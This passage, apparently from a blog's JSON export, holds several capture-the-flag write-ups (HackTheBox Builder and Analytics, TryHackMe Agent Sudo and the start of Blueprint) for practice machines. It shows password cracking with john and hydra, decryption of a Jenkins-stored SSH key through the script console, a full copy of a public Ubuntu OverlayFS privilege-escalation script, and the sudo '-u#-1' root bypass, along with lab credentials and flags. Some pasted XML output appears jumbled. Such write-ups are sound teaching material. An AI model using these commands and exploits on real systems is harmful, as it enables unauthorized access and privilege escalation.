other tab, we can start the container - sudo docker exec -it \u0026lt;id\u0026gt; /bin/sh - we will get \u0026lt;id\u0026gt; from docker ps\nFile Structure from local file just for understanding. So basically here there is users folder and in that folder, there is users.xml file in which it contains the user information of Jenkins. When we read file, we found it has admin and the another name admin_14267207368007926863 which is indeed another directory and then after going in that directory we found config.xml in which there is the password for admin user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ cd /var/jenkins_home $ ls config.xml copy_reference_file.log failed-boot-attempts.txt hudson.model.UpdateCenter.xml jenkins.telemetry.Correlator.xml jobs nodeMonitors.xml plugins secret.key secret.key.not-so-secret secrets userContent users war $ cd users $ ls admin_14267207368007926863 users.xml $ cat users.xml \u0026lt;?xml version=\u0026#39;1.1\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt; \u0026lt;hudson.model.UserIdMapper\u0026gt; \u0026lt;version\u0026gt;1\u0026lt;/version\u0026gt; \u0026lt;idToDirectoryNameMap class=\u0026#34;concurrent-hash-map\u0026#34;\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;string\u0026gt;admin\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;admin_14267207368007926863\u0026lt;/string\u0026gt; \u0026lt;/entry\u0026gt; \u0026lt;/idToDirectoryNameMap\u0026gt; \u0026lt;/hudson.model.UserIdMapper\u0026gt; $ cd admin_14267207368007926863 $ ls config.xml So, we will do same thing HTB’s machine.\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt; /var/jenkins_home/users/users.xml \u0026lt;?xml version=\u0026#39;1.1\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt; \u0026lt;string\u0026gt;jennifer_12108429903186576833\u0026lt;/string\u0026gt; \u0026lt;idToDirectoryNameMap class=\u0026#34;concurrent-hash-map\u0026#34;\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;string\u0026gt;jennifer\u0026lt;/string\u0026gt; \u0026lt;version\u0026gt;1\u0026lt;/version\u0026gt; \u0026lt;/hudson.model.UserIdMapper\u0026gt; \u0026lt;/idToDirectoryNameMap\u0026gt; \u0026lt;hudson.model.UserIdMapper\u0026gt; \u0026lt;/entry\u0026gt; File to download: We found, there is a user named as jennifer and the directory name is jennifer_12108429903186576833.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 \u0026gt; var/jenkins_home/users/jennifer_12108429903186576833/config.xml [22/49] \u0026lt;hudson.tasks.Mailer_-UserProperty plugin=\u0026#34;mailer@463.vedf8358e006b_\u0026#34;\u0026gt; \u0026lt;hudson.search.UserSearchProperty\u0026gt; \u0026lt;roles\u0026gt; \u0026lt;jenkins.security.seed.UserSeedProperty\u0026gt; \u0026lt;/tokenStore\u0026gt; \u0026lt;/hudson.search.UserSearchProperty\u0026gt; \u0026lt;timeZoneName\u0026gt;\u0026lt;/timeZoneName\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;jenkins.security.LastGrantedAuthoritiesProperty\u0026gt; \u0026lt;flags/\u0026gt; \u0026lt;hudson.model.MyViewsProperty\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;/jenkins.security.ApiTokenProperty\u0026gt; \u0026lt;views\u0026gt; \u0026lt;string\u0026gt;authenticated\u0026lt;/string\u0026gt; \u0026lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=\u0026#34;display-url-api@2.200.vb_9327d658781\u0026#34;\u0026gt; \u0026lt;user\u0026gt; \u0026lt;name\u0026gt;all\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;\u0026lt;/description\u0026gt; \u0026lt;emailAddress\u0026gt;jennifer@builder.htb\u0026lt;/emailAddress\u0026gt; \u0026lt;collapsed/\u0026gt; \u0026lt;/jenkins.security.seed.UserSeedProperty\u0026gt; \u0026lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty\u0026gt; \u0026lt;/hudson.model.MyViewsProperty\u0026gt; \u0026lt;domainCredentialsMap class=\u0026#34;hudson.util.CopyOnWriteMap$Hash\u0026#34;/\u0026gt; \u0026lt;filterQueue\u0026gt;false\u0026lt;/filterQueue\u0026gt; \u0026lt;jenkins.security.ApiTokenProperty\u0026gt; \u0026lt;primaryViewName\u0026gt;\u0026lt;/primaryViewName\u0026gt; \u0026lt;/views\u0026gt; \u0026lt;/hudson.model.TimeZoneProperty\u0026gt; \u0026lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=\u0026#34;credentials@1319.v7eb_51b_3a_c97b_\u0026#34;\u0026gt; \u0026lt;/hudson.model.PaneStatusProperties\u0026gt; \u0026lt;/hudson.tasks.Mailer_-UserProperty\u0026gt; \u0026lt;tokenList/\u0026gt; \u0026lt;jenkins.console.ConsoleUrlProviderUserProperty/\u0026gt; \u0026lt;/hudson.model.AllView\u0026gt; \u0026lt;timestamp\u0026gt;1707318554385\u0026lt;/timestamp\u0026gt; \u0026lt;owner class=\u0026#34;hudson.model.MyViewsProperty\u0026#34; reference=\u0026#34;../../..\u0026#34;/\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty\u0026gt; \u0026lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty\u0026gt; \u0026lt;hudson.security.HudsonPrivateSecurityRealm_-Details\u0026gt; \u0026lt;insensitiveSearch\u0026gt;true\u0026lt;/insensitiveSearch\u0026gt; \u0026lt;properties class=\u0026#34;hudson.model.View$PropertyList\u0026#34;/\u0026gt; \u0026lt;hudson.model.TimeZoneProperty\u0026gt; \u0026lt;hudson.model.AllView\u0026gt; \u0026lt;/hudson.security.HudsonPrivateSecurityRealm_-Details\u0026gt; \u0026lt;providerId\u0026gt;default\u0026lt;/providerId\u0026gt; \u0026lt;/roles\u0026gt; \u0026lt;/jenkins.security.LastGrantedAuthoritiesProperty\u0026gt; \u0026lt;jenkins.model.experimentalflags.UserExperimentalFlagsProperty\u0026gt; \u0026lt;hudson.model.PaneStatusProperties\u0026gt; \u0026lt;?xml version=\u0026#39;1.1\u0026#39; encoding=\u0026#39;UTF-8\u0026#39;?\u0026gt; \u0026lt;fullName\u0026gt;jennifer\u0026lt;/fullName\u0026gt; \u0026lt;seed\u0026gt;6841d11dc1de101d\u0026lt;/seed\u0026gt; \u0026lt;id\u0026gt;jennifer\u0026lt;/id\u0026gt; \u0026lt;version\u0026gt;10\u0026lt;/version\u0026gt; \u0026lt;tokenStore\u0026gt; \u0026lt;filterExecutors\u0026gt;false\u0026lt;/filterExecutors\u0026gt; \u0026lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin=\u0026#34;theme-manager@215.vc1ff18d67920\u0026#34;/\u0026gt; \u0026lt;passwordHash\u0026gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a\u0026lt;/passwordHash\u0026gt; File to download: In config.php we found this passwordHash - #jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a\nStore this hash in user.hash and then using john we can get the password.\n1 2 3 4 5 6 7 john --wordlist=/usr/share/wordlists/rockyou.txt user.hash Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status princess (#jbcrypt) User Password jennifer princess Now that I have user and password, I tried to login with SSH, but no luck. Next logical step will be to login with this creds from Jenkin’s Instance on web.\nAfter messing around with in the dashboard, I found Credentials tab in Manage Jenkins, in that there is a cred for root. On navigating the file, we can see something like this,\nThe key is Concealed for Confidentiality. However in the source code we can able to see the private key.\n1 {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} I tried to decrypt with base64 encoding, but it is encrypted. I found this answer to decrypt the private key → https://stackoverflow.com/a/37683492\nGo to “Manage Jenkins” from Dashboard → “Script Console” on bottom — here we can able to run scripts — we also can get reverse shell using script console. Anyway, as of now, we will focus on decrypting our privatekey. Use this command to get the private ssh keys → println( hudson.util.Secret.decrypt(\u0026quot;ENCRYPTED_PASSPHRASE_OR_PASSWORD\u0026quot;) )\nSave this private key into the filename key, change the permission to 600 and login with ssh.\nWe got the flag.\n1 2 root@builder:~# cat root.txt e312ca26bd37fcbad7bd5f74ce90e78a ","description":"Detailed walkthrough of the Builder box on HackTheBox platform, covering initial enumeration with LFI, exploiting vulnerabilities, and obtaining user and root flags.","id":18,"section":"posts","tags":["HackTheBox","CVE","Jenkins"],"title":"HackTheBox Writeup - Builder Room","uri":"https://g4nd1v.github.io/posts/hackthebox-builder/"},{"content":" Title Analytics Description Analytics is HackTheBox Easy Linux Based Machine. Difficulty Easy Maker 7u9y and TheCyberGeek Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 └─$ nmap -sC -sV -oA nmap/analytics 10.10.11.233 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-25 20:13 EDT Nmap scan report for 10.10.11.233 Host is up (0.038s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75🇩🇪4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://analytical.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.93 seconds I didn’t find anything interesting in the webpage, therefore I ran gobuster if I can find anything, but again, no luck.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 └─$ gobuster dir -u analytical.htb -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://analytical.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /css (Status: 301) [Size: 178] [--\u0026gt; http://analytical.htb/css/] /images (Status: 301) [Size: 178] [--\u0026gt; http://analytical.htb/images/] /index.html (Status: 200) [Size: 17169] /js (Status: 301) [Size: 178] [--\u0026gt; http://analytical.htb/js/] Progress: 4614 / 4615 (99.98%) Next logical step will be to find subdomains. I have used ffuf to find it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 └─$ ffuf -u http://analytical.htb -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#39;Host: FUZZ.analytical.htb\u0026#39; -fs 154 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://analytical.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.analytical.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 154 ________________________________________________ data [Status: 200, Size: 77883, Words: 3574, Lines: 28, Duration: 86ms] We got subdomain data. Adding this domain to /etc/hosts .\n1 2 3 └─$ cat /etc/hosts ... 10.10.11.233 analytical.htb data.analytical.htb When I visited the page, I can see a login form from metabase, next thing I did was to find CVE in Metabase and luckily I got one!\nCVE - CVE-2023-38646\nYou will get session-token from /api/session/properties on data subdomain.\nAnd boom, we got reverse shell!\nUser Flag So after getting shell, I have checked user directory, there is no user.txt file. So I have started enumerating in different folders and lastly I found user and pass from env.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 f3ac61d15a77:/$ env env SHELL=/bin/sh MB_DB_PASS= HOSTNAME=f3ac61d15a77 LANGUAGE=en_US:en MB_JETTY_HOST=0.0.0.0 JAVA_HOME=/opt/java/openjdk MB_DB_FILE=//metabase.db/metabase.db PWD=/ LOGNAME=metabase MB_EMAIL_SMTP_USERNAME= HOME=/home/metabase LANG=en_US.UTF-8 META_USER=metalytics META_PASS=An4lytics_ds20223# MB_EMAIL_SMTP_PASSWORD= USER=metabase SHLVL=4 MB_DB_USER= FC_LANG=en-US LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib LC_CTYPE=en_US.UTF-8 MB_LDAP_BIND_DN= LC_ALL=en_US.UTF-8 MB_LDAP_PASSWORD= PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin MB_DB_CONNECTION_URI= JAVA_VERSION=jdk-11.0.19+7 _=/usr/bin/env Login with ssh → ssh metalytics@analytical.htb - password - An4lytics_ds20223#.\nUser Flag: 76ea979945743429071a9891a2f47620\nRoot Flag I have tried sudo -l but the user cannot use sudo. So I have ran linpeas. I found nothing interesting there.\nI have checked the kernel version and found there is a public exploit for it CVE-2023–2640.\n1 2 metalytics@analytics:/tmp$ uname -a Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629\n1 2 3 4 5 6 7 8 9 10 #!/bin/bash # CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation # by g1vi https://github.com/g1vi # October 2023 echo \u0026#34;[+] You should be root now\u0026#34; echo \u0026#34;[+] Type \u0026#39;exit\u0026#39; to finish and leave the house cleaned\u0026#34; unshare -rm sh -c \u0026#34;mkdir l u w m \u0026amp;\u0026amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m \u0026amp;\u0026amp; touch m/*;\u0026#34; \u0026amp;\u0026amp; u/python3 -c \u0026#39;import os;os.setuid(0);os.system(\u0026#34;cp /bin/bash /var/tmp/bash \u0026amp;\u0026amp; chmod 4755 /var/tmp/bash \u0026amp;\u0026amp; /var/tmp/bash -p \u0026amp;\u0026amp; rm -rf l m u w /var/tmp/bash\u0026#34;)\u0026#39; Run this script on the ssh machine, and we will get the root\nRoot Flag: f40e47ddd824d9c5354612f67c919b9d\n","description":"Analytics is HackTheBox Easy Linux Based Machine.","id":19,"section":"posts","tags":["HackTheBox","CVE"],"title":"HackTheBox Writeup - Analytics Room","uri":"https://g4nd1v.github.io/posts/hackthebox-analytics/"},{"content":" Title https://tryhackme.com/room/agentsudoctf Description You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. Difficulty Easy Maker https://tryhackme.com/p/DesKel Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 └─$ nmap -sC -sV -oA nmap/agentsudo 10.10.235.44 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 15:57 EST Nmap scan report for 10.10.235.44 Host is up (0.13s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA) | 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA) |_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Annoucement Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel There is no CVE we found from NMAP Scan.\nWebsite is giving some hint, it is saying use your codename as user-agent to access this site.\nAs the hint suggest, we have to use agent name in user-agent, so I opened burpsuite and edit user-agent as name of the agent.\nIt is saying - What are you doing! Are you one of the 25 employees? If not, I going to report this incident.\nNow, Instead of R, I tried different alphabets like A,B and so on. While testing for C we got the location, /agent_C_attention.php .\nSo the name of the agent is chris.\nNow, there is a ftp port open. So I tried to run ftp with default creds, but it didn’t work, so we have to bruteforce ftp using hydra.\n1 2 3 └─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.235.44 ftp ... [21][ftp] host: 10.10.235.44 login: chris password: crystal We found the password for chris\u0026rsquo;s ftp server, that is crystal. Let’s login into FTP and see what is inside it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 └─$ ftp chris@10.10.235.44 Connected to 10.10.235.44. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||21299|) 150 Here comes the directory listing. -rw-r--r-- 1 0 0 217 Oct 29 2019 To_agentJ.txt -rw-r--r-- 1 0 0 33143 Oct 29 2019 cute-alien.jpg -rw-r--r-- 1 0 0 34842 Oct 29 2019 cutie.png 226 Directory send OK. I have downloaded the files using get \u0026lt;filename\u0026gt; from FTP. Let’s see what is in To_agentJ.txt file.\n1 2 3 4 5 6 7 └─$ cat To_agentJ.txt Dear agent J, All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn\u0026#39;t be a problem for you. From, Agent C So, from this we got the hint that there is come kind of file inside this image. So I have used binwalk to get the data out of that image.\nbinwalk -e cutie.png → There is a zip file which contains password. So using john we can crack the password for the zip file.\n1 2 3 4 5 └─$ zip2john 8702.zip \u0026gt; hash.hash └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.hash ... alien (8702.zip/To_agentR.txt) So the password for the zip file us alien.\nThe zip file contain the following information.\n1 2 3 4 5 6 7 └─$ cat To_agentR.txt Agent C, We need to send the picture to \u0026#39;QXJlYTUx\u0026#39; as soon as possible! By, Agent R It seems like some kind of encoding, let’s try base64.\n1 2 └─$ echo QXJlYTUx | base64 -d Area51 user flag It seems Area51 is the password to decrypt data from cute-alien.jpg file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 └─$ steghide --extract -sf cute-alien.jpg Enter passphrase: wrote extracted data to \u0026#34;message.txt\u0026#34;. ┌──(kali㉿kali)-[~/Desktop/tryhackme/agentsudo] └─$ cat message.txt Hi james, Glad you find this message. Your login password is hackerrules! Don\u0026#39;t ask me why the password look cheesy, ask agent R who set this password for you. Your buddy, chris The other Agent’s name is james and the password of ssh for james is hackerrules!.\n1 2 3 4 james@agent-sudo:~$ ls Alien_autospy.jpg user_flag.txt james@agent-sudo:~$ cat user_flag.txt b03d975e8c92a7c04146cfa7a5a313c7 root flag Download the file Alient_autospy.jpg using scp and reverse search in google.\n└─$ sudo scp [james@10.10.235.44](mailto:james@10.10.235.44):Alien_autospy.jpg .\nAnswer is - Roswell alien autopsy\nRoot exploit article - https://www.exploit-db.com/exploits/47502\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 james@agent-sudo:~$ sudo -l Matching Defaults entries for james on agent-sudo: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User james may run the following commands on agent-sudo: (ALL, !root) /bin/bash james@agent-sudo:~$ sudo -u#-1 /bin/bash root@agent-sudo:~# cat /root/root.txt To Mr.hacker, Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. Your flag is b53a02f55b57d4439e3341834d70c062 By, DesKel a.k.a Agent R ","description":"You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.","id":20,"section":"posts","tags":["TryHackMe","Bruteforce","FTP","Hydra","CVE","Steganography"],"title":"TryHackMe Writeup - Agent Sudo Room","uri":"https://g4nd1v.github.io/posts/tryhackme-agentsudo/"},{"content":" Title https://tryhackme.com/room/blueprint Description Hack into this Windows machine and escalate your privileges to Administrator. Difficulty Easy Maker https://tryhackme.com/p/MrSeth6797 Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 └─$ nmap -sC -sV -oA nmap/blueprint 10.10.28.87 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 12:33 EST Nmap scan report for 10.10.28.87 Host is up (0.15s latency). Not shown: 987 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: 404 - File or directory not found. | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-title: Index of / |_ssl-date: TLS randomness does not represent time | http-ls: Volume / | SIZE TIME FILENAME | - 2019-04-11 22:52 oscommerce-2.3.4/ | - 2019-04-11 22:52 oscommerce-2.3.4/catalog/ | - 2019-04-11 22:52 oscommerce-2.3.4/docs/ |_ | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 445/tcp open microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) 8080/tcp open http Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28) |_http-title: Index of / |_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 | http-ls: Volume / | SIZE TIME FILENAME | - 2019-04-11 22:52 oscommerce-2.3.4/ | - 2019-04-11 22:52 